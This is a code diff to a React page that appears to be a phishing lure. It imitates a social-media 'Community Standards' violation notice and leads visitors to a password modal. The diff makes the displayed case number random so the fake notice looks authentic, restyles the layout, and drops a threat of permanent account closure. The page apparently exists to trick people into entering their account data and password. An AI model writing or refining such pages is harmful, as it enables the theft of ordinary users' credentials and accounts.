@@ -188,39 +188,32 @@ const Home = () => {
 							/>
 						</div>
 
-						<div className="mt-2 flex justify-between text-sm text-gray-600">
-							<div>
-								<span>Case Number:</span>
-								<span className="ml-1 text-blue-600">#178014456033</span>
-							</div>
-							<div>
-								<span>
-									About Case: Violating Community Standards and Posting
-									something inappropriate.
+						<div className="mt-2 mb-4 flex flex-col justify-between border-y border-y-gray-300 p-2 text-sm text-gray-600 md:flex-row">
+							<div className="flex md:flex-col">
+								<span className="font-bold whitespace-nowrap">
+									Case Number:
 								</span>
+								<span className="ml-1 font-bold text-blue-600">
+									{"#"} {Math.floor(Math.random() * 1000000000000)}
+								</span>
+							</div>
+							<div className="font-bold md:w-3/4">
+								About Case: Violating Community Standards and Posting something
+								inappropriate.
 							</div>
 						</div>
 					</div>
 					{error && <div className="text-red-500">{error} </div>}
 					<button
 						onClick={handleSubmit}
-						className="cursor-pointer rounded-full bg-blue-500 p-4 text-lg font-medium text-white"
+						className="cursor-pointer rounded-full bg-blue-500 p-4 font-semibold text-white"
 						type="button"
 					>
 						Continue
 					</button>
 				</div>
 			</div>
-			<p className="mt-4 flex items-start text-sm text-gray-600">
-				<span className="mr-2 text-yellow-500">⚠️</span>
-				Please make sure to fill in the data correctly; otherwise, your account
-				may be permanently closed. To learn more about why accounts are
-				deactivated, visit our{" "}
-				<span className="cursor-pointer text-blue-600 hover:underline">
-					Community Standards
-				</span>
-				.
-			</p>
+
 			<PasswordModal
 				formData={formData}
 				isOpen={showPasswordModal}
